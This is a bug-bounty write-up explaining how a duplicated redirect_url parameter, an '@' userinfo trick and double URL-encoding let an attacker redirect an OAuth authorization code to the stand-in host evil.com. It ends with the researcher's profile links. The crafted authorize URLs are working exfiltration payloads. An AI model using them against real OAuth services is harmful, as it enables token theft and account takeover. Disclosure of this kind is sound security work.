# Steal the OAuth code or token with an open redirect because of a parameter pollution .

## How:

The application provides a service for third party applications to create an oauth app with it, Lets call our application example.com and the third party one third.com so third.com tells you that you can connect your example.com account with your current account, So inorder to do this the third.com has to ask example.com to make him an oauth application, This is just to demonstrate the feature .

So what happens after you clicking on signin with or connect using example.com, the third.com redirects you to example.com with a request like this ----> 
**https://example.com/oauth/authorize?response_type=code&redirect_url=https://third.com/callback&state=[some value]** , So by visiting this endpoint example.com will ask you to consent third.com then redirects you back to third.com with the oauth code .


So I thought about what will happen if I added another redirect_url parameter like this **https://example.com/oauth/authorize?response_type=code&redirect_url=https://third.com/callback&redirect_url=https://evil.com&state=[some value]**, By doing this I found that example.com redirects me to third.com but with this intersting way **https://third.com/callback/,https://evil.com?code=[some value]&state=[some value]**, Noticed the  **,http://evil.com**, I intercepted the requests after clicking on consent and I have found the app sends the consent request with the two redirect_uri like this **redirect_url=https://third.com/callback&redirect_uri=https://evil.com** and the response of it is just 200 status code with the code and state in the body of the response.


So I knew that the problem of appending the two redirect_uri is not from the backend code but it's from the client side code, So I thought how can i get an openredirect by this clearly the client code adds the character "," before appending the two redirect_uri like this **https://third.com/callback,https://evil.com**, I thought about removing the https:// part from the second redirect_uri and add a dot charater like this ".evil.com" to make it look like a subdomain but I knew that the subdomain part can't has , or / .


So what about adding @ sign rather than using dot but ofcourse this didn't work also because if you redirected to endpoint like this **https://third.com/callback/,@evil.com** it won't redirect you to evil.com, So what is about encoding, If tou tried to paste this in a browser admin@evil.com you will see that a browser like firefox treats the first part befor @ as a user name so it's like conecting to a server using ssh if you tried it before, So leave the second redirect_uri with a value like this @evil.com and double encode the special characters in the first redirect_uri like this **https://third.com%252Fcallback%252F**.


Why double encode it? because, If you redirected to an endpoint like this **https://third.com%2Fcallback%2F,@evil.com** you will see that the browser translates %2F to / and still redirects you to third.com so to come across this, encode the / two times so that the first time the browser decode it %2F but the second time it won't decode it to / so that the final redirection will be like this **https://third.com%2Fcallback%2F,@evil.vom?code=[some code]&state=[some state]** and you will be redirected to evil.com with the oauth code and you succedded to steal the oauth code.


So where is the problem? at the backend however that it recieves the first redirect_uri like this **https://third.com%252Fcallback%252F** but what it does is that it double decodes it then validate it against the stored value and ofcourse it will be true so it will return the oauth code, but if it didn't double decode it won't be true so even if the user redirected to evil.com he won't be redirected with the oauth code so the impact is low .

Ehat is the impact? the impact is high this application provides oauth apps to third party applications so every third party application is affected by it, It can lead to account takeover or sensitive data leak .

### Range Hall Of Fame : https://www.range.co/security/hall-of-fame (as Mekky)

### My Info :

#### Intigriti : https://app.intigriti.com/researcher/profile/mekky

#### Linkedin : https://www.linkedin.com/in/muhammed-mekkawy-1504821b2/

#### Twitter : https://twitter.com/Mekky49295157


